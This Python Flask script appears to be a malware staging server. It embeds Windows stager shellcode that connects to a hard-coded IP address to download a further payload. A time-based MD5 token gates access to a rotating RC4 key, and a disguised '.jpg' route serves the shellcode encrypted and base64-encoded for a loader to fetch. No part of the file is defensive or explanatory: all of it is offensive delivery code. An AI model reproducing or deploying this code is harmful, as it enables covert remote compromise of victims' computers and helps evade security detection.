#coding:utf-8
from arc4 import ARC4
import base64
import time
from flask import *
import hashlib

import random
import string
app = Flask(__name__)

buf = b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x3d\x0d\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x47\x58\x4b\x72\x00\xcb\x09\x1e\xbe\x61\x6a\x42\xcd\xa7\xb6\x3b\xe5\xe7\x14\xdb\xe2\xc2\x8a\x9e\x2e\xeb\xdc\x2c\xac\x29\x46\x28\x9c\x12\x08\xa5\x00\x1f\xde\xa0\x71\x34\xf6\x80\x29\xdb\xd2\x81\xe5\x0e\x9e\xce\x69\x84\x7c\x76\xb6\xad\xca\x02\x78\x97\x49\x66\x99\xf7\xd1\xb4\x27\xac\xf9\x65\x9d\x12\xc8\x86\x04\xa3\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x71\x64\x65\x73\x6b\x20\x32\x2e\x34\x2e\x31\x32\x36\x33\x2e\x32\x30\x33\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x29\x0d\x0a\x00\xc1\x8f\xcd\x8a\xb8\x85\x0c\x38\x6f\x7f\x76\xba\xa2\xad\x19\xc3\x4a\xbd\xc3\x3e\x5b\x66\x95\xb0\x33\x59\x2f\x6a\x1d\xc1\x75\xae\x6e\xeb\xfa\xb6\x43\x46\x6c\x48\x0e\x87\x45\xcd\x2f\xc1\xc6\xf0\x08\x3e\x56\x19\xe3\x05\x27\xe0\x36\xa0\x79\x63\x85\x7a\x60\x34\xc8\x2c\x65\x80\xd6\x8c\xd6\x38\xd0\x1d\xb1\x34\xce\x47\x8e\x1f\x54\x5d\x71\xee\x3d\x17\x60\x28\x09\xf1\x9f\x87\x06\xc3\x8d\x8a\x09\x2e\xaa\x7b\x0c\x9b\xb7\x27\x43\x57\xf8\x24\x22\x26\x1d\x31\xd3\x4e\x11\x94\xd9\x9f\xbb\xa0\xcb\x82\x69\xbd\xee\x18\xf3\x44\xfc\x07\xf1\x91\x69\x9d\x78\x6e\x0f\x3a\xac\x9c\xbf\x22\xee\x08\x0c\x07\x51\x35\x4e\x6a\x45\xe6\xea\x52\x30\x72\x0a\x6c\x7f\x24\x65\x5d\x50\x27\x2b\x9f\x4d\xe7\x79\x3d\x69\xb0\x4a\x9c\x7f\x8c\x91\x4a\x3e\xb0\x1f\xa5\x34\x2e\xa5\xf9\x8b\xfb\x0f\xb8\x99\x63\x82\x6b\x0d\x8d\xaf\x22\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x33\x2e\x31\x37\x36\x2e\x32\x33\x32\x00\x6f\xaa\x51\xc3";
buf2 = "test"
obs = "vtyuiaslkjfasfalsflkhlksadjlkgjlkdsajglkadnlkgsd"
keys = [int(time.time()),''.join(random.sample(string.ascii_letters + string.digits, 32))]
@app.route('/<key>')
def Center(key):

    t = time.time()
    t = int(int(t) / 100)
    hl = hashlib.md5()
    hl.update((obs+str(t)).encode(encoding='utf-8'))
    md5 = hl.hexdigest()
    if key ==md5:
        global keys
        print(int(time.time()),keys[0])
        if int(time.time())-keys[0] >= 10:
            salt = ''.join(random.sample(string.ascii_letters + string.digits, 32))
            print(salt)
            keys[1] = salt
            keys[0]=int(time.time())
        print(keys)
        return keys[1]
    elif key==str(int(int(time.time()) / 10))+".jpg":

        arc4 = ARC4(keys[1])
        enc = arc4.encrypt(buf)
        b64 =  base64.b64encode(enc)
        arc3 = ARC4(keys[1])
        dec = arc3.decrypt(enc)
        return b64.decode()
    return "nothing"
@app.route("/my/get_size")
def size():
    return str(len(buf))
#encrypted = encrypt(buf, key)
if __name__ == '__main__':
    app.run(host="0.0.0.0",port=81)
